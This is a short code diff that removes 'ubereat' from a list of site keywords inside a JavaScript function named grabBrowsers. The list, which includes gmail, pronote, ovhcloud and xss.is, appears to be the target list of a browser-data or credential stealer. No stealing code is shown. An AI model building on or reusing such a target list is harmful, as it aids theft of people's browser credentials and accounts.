@@ -623,7 +623,6 @@ async function grabBrowsers() {
         "gmail",
         "youtube",
         "onoff",
-        "ubereat"
         "xss.is",
         "pronote",
         "ovhcloud",
